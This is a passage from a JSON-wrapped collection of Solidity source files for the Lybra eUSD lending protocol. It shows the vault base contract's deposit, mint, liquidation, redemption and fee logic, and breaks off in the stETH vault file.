Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     *\n     * @dev Withdraw stETH. Check user’s collateral ratio after withdrawal, should be higher than `safeCollateralRatio`\n     */\n    function withdraw(address onBehalfOf, uint256 amount) external virtual {\n        require(onBehalfOf != address(0), \"TZA\");\n        require(amount > 0, \"ZERO_WITHDRAW\");\n        require(depositedAsset[msg.sender] >= amount, \"Withdraw amount exceeds deposited amount.\");\n        totalDepositedAsset -= amount;\n        depositedAsset[msg.sender] -= amount;\n\n        uint256 withdrawal = checkWithdrawal(msg.sender, amount);\n\n        collateralAsset.transfer(onBehalfOf, withdrawal);\n        if (borrowed[msg.sender] > 0) {\n            _checkHealth(msg.sender, getAssetPrice());\n        }\n        emit WithdrawAsset(msg.sender, address(collateralAsset), onBehalfOf, withdrawal, block.timestamp);\n    }\n\n    function checkWithdrawal(address user, uint256 amount) internal view returns (uint256 withdrawal) {\n        withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;\n    }\n\n    /**\n     * @notice The mint amount number of EUSD is minted to the address\n     * Emits a `Mint` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0. Individual mint amount shouldn't surpass 10% when the circulation reaches 10_000_000\n     */\n    function mint(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"MINT_TO_THE_ZERO_ADDRESS\");\n        require(amount > 0, \"ZERO_MINT\");\n        _mintEUSD(msg.sender, onBehalfOf, amount, getAssetPrice());\n    }\n\n    /**\n     * @notice Burn the amount of EUSD and payback the amount of minted EUSD\n     * Emits a `Burn` event.\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     * @dev Calling the internal`_repay`function.\n     */\n    function burn(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"BURN_TO_THE_ZERO_ADDRESS\");\n        _repay(msg.sender, onBehalfOf, amount);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is above 150%, Keeper liquidates borrowers whose collateral ratio is below badCollateralRatio, using EUSD provided by Liquidation Provider.\n     *\n     * Requirements:\n     * - onBehalfOf Collateral Ratio should be below badCollateralRatio\n     * - collateralAmount should be less than 50% of collateral\n     * - provider should authorize Lybra to utilize EUSD\n     * @dev After liquidation, borrower's debt is reduced by collateralAmount * etherPrice, collateral is reduced by the collateralAmount corresponding to 110% of the value. Keeper gets keeperRatio / 110 of Liquidation Reward and Liquidator gets the remaining stETH.\n     */\n    function liquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < badCollateralRatio, \"Borrowers collateral ratio should below badCollateralRatio\");\n\n        require(assetAmount * 2 <= depositedAsset[onBehalfOf], \"a max of 50% collateral can be liquidated\");\n        require(EUSD.allowance(provider, address(this)) > 0, \"provider should authorize to provide liquidation EUSD\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n\n        _repay(provider, onBehalfOf, eusdAmount);\n        uint256 reducedAsset = (assetAmount * 11) / 10;\n        totalDepositedAsset -= reducedAsset;\n        depositedAsset[onBehalfOf] -= reducedAsset;\n        uint256 reward2keeper;\n        if (provider == msg.sender) {\n            collateralAsset.transfer(msg.sender, reducedAsset);\n        } else {\n            reward2keeper = (reducedAsset * configurator.vaultKeeperRatio(address(this))) / 110;\n            collateralAsset.transfer(provider, reducedAsset - reward2keeper);\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, reducedAsset, reward2keeper, false, block.timestamp);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is below badCollateralRatio, borrowers with collateralRatio below 125% could be fully liquidated.\n     * Emits a `LiquidationRecord` event.\n     *\n     * Requirements:\n     * - Current overallCollateralRatio should be below badCollateralRatio\n     * - `onBehalfOf`collateralRatio should be below 125%\n     * @dev After Liquidation, borrower's debt is reduced by collateralAmount * etherPrice, deposit is reduced by collateralAmount * borrower's collateralRatio. Keeper gets a liquidation reward of `keeperRatio / borrower's collateralRatio\n     */\n    function superLiquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, \"overallCollateralRatio should below 150%\");\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < 125 * 1e18, \"borrowers collateralRatio should below 125%\");\n        require(assetAmount <= depositedAsset[onBehalfOf], \"total of collateral can be liquidated at most\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n        if (onBehalfOfCollateralRatio >= 1e20) {\n            eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;\n        }\n        require(EUSD.allowance(provider, address(this)) >= eusdAmount, \"provider should authorize to provide liquidation EUSD\");\n\n        _repay(provider, onBehalfOf, eusdAmount);\n\n        totalDepositedAsset -= assetAmount;\n        depositedAsset[onBehalfOf] -= assetAmount;\n        uint256 reward2keeper;\n        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {\n            reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        collateralAsset.transfer(provider, assetAmount - reward2keeper);\n\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, assetAmount, reward2keeper, true, block.timestamp);\n    }\n\n    /**\n     * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.\n     * Emits a `LSDistribution` event.\n     *\n     * *Requirements:\n     * - stETH balance in the contract cannot be less than totalDepositedAsset after exchange.\n     * @dev Income is used to cover accumulated Service Fee first.\n     */\n    function excessIncomeDistribution(uint256 payAmount) external virtual;\n\n    /**\n     * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH\n     * Emits a `RigidRedemption` event.\n     *\n     * *Requirements:\n     * - `provider` must be a Redemption Provider\n     * - `provider`debt must equal to or above`eusdAmount`\n     * @dev Service Fee for rigidRedemption `redemptionFee` is set to 0.5% by default, can be revised by DAO.\n     */\n    function rigidRedemption(address provider, uint256 eusdAmount) external virtual {\n        require(configurator.isRedemptionProvider(provider), \"provider is not a RedemptionProvider\");\n        require(borrowed[provider] >= eusdAmount, \"eusdAmount cannot surpass providers debt\");\n        uint256 assetPrice = getAssetPrice();\n        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];\n        require(providerCollateralRatio >= 100 * 1e18, \"provider's collateral ratio should more than 100%\");\n        _repay(msg.sender, provider, eusdAmount);\n        uint256 collateralAmount = (((eusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;\n        depositedAsset[provider] -= collateralAmount;\n        totalDepositedAsset -= collateralAmount;\n        collateralAsset.transfer(msg.sender, collateralAmount);\n        emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Mints eUSD tokens for a user.\n     * @param _provider The provider's address.\n     * @param _onBehalfOf The user's address.\n     * @param _mintAmount The amount of eUSD tokens to be minted.\n     * @param _assetPrice The current collateral asset price.\n     * @dev Mints eUSD tokens for the specified user, updates the total supply and borrowed balance,\n     * refreshes the mint reward for the provider, checks the health of the provider,\n     * and emits a Mint event.\n     * Requirements:\n     * The total supply plus mint amount must not exceed the maximum supply allowed for the vault.\n     * The provider must have sufficient borrowing capacity to mint the specified amount.\n     */\n    function _mintEUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {\n        require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), \"ESL\");\n        try configurator.refreshMintReward(_provider) {} catch {}\n        borrowed[_provider] += _mintAmount;\n\n        EUSD.mint(_onBehalfOf, _mintAmount);\n        _saveReport();\n        poolTotalEUSDCirculation += _mintAmount;\n        _checkHealth(_provider, _assetPrice);\n        emit Mint(msg.sender, _onBehalfOf, _mintAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Burn _provideramount EUSD to payback minted EUSD for _onBehalfOf.\n     *\n     * @dev Refresh LBR reward before reducing providers debt. Refresh Lybra generated service fee before reducing totalEUSDCirculation.\n     */\n    function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {\n        uint256 amount = borrowed[_onBehalfOf] >= _amount ? _amount : borrowed[_onBehalfOf];\n\n        EUSD.burn(_provider, amount);\n        try configurator.refreshMintReward(_onBehalfOf) {} catch {}\n\n        borrowed[_onBehalfOf] -= amount;\n        _saveReport();\n        poolTotalEUSDCirculation -= amount;\n        emit Burn(_provider, _onBehalfOf, amount, block.timestamp);\n    }\n\n    /**\n     * @dev Get USD value of current collateral asset and minted EUSD through price oracle / Collateral asset USD value must higher than safe Collateral Ratio.\n     */\n    function _checkHealth(address _user, uint256 _assetPrice) internal view {\n        if (((depositedAsset[_user] * _assetPrice * 100) / borrowed[_user]) < configurator.getSafeCollateralRatio(address(this))) revert(\"collateralRatio is Below safeCollateralRatio\");\n    }\n\n    function _saveReport() internal {\n        feeStored += _newFee();\n        lastReportTime = block.timestamp;\n    }\n\n    function _newFee() internal view returns (uint256) {\n        return (poolTotalEUSDCirculation * configurator.vaultMintFeeApy(address(this)) * (block.timestamp - lastReportTime)) / (86400 * 365) / 10000;\n    }\n\n    /**\n     * @dev Return USD value of current ETH through Liquity PriceFeed Contract.\n     */\n    function _etherPrice() internal returns (uint256) {\n        return etherOracle.fetchPrice();\n    }\n\n    function getBorrowedOf(address user) external view returns (uint256) {\n        return borrowed[user];\n    }\n\n    function getPoolTotalEUSDCirculation() external view returns (uint256) {\n        return poolTotalEUSDCirculation;\n    }\n\n    function getAsset() external view virtual returns (address) {\n        return address(collateralAsset);\n    }\n\n    function getVaultType() external pure returns (uint8) {\n        return vaultType;\n    }\n\n    function getAssetPrice() public virtual returns (uint256);\n}"
    },
    {
      "filename": "contracts/lybra/pools/LybraStETHVault.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.17;\n\nimport \"../interfaces/IEUSD.sol\";\nimport \"./base/LybraEUSDVaultBase.sol\";\n\ninterface Ilido {\n    function submit(address _referral) external payable returns (uint256 StETH);\n}\n\ncontract LybraStETHDepositVault is LybraEUSDVaultBase {\n    // Currently, the official rebase time for Lido is between 12PM to 13PM UTC.\n    uint256 public lidoRebaseTime = 12 hours;\n\n    // stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84\n    // oracle = 0x4c517D4e2C851CA76d7eC94B805269Df0f2201De\n    constructor(address _config, address _stETH, address _oracle) LybraEUSDVaultBase(_stETH, _oracle, _config) {\n    }\n\n    /**\n     * @notice Sets the rebase time for Lido based on the actual situation.\n     * This function can only be called by an address with the ADMIN role.\n     */\n    function setLidoRebaseTime(uint256 _t"
    }
  ]
}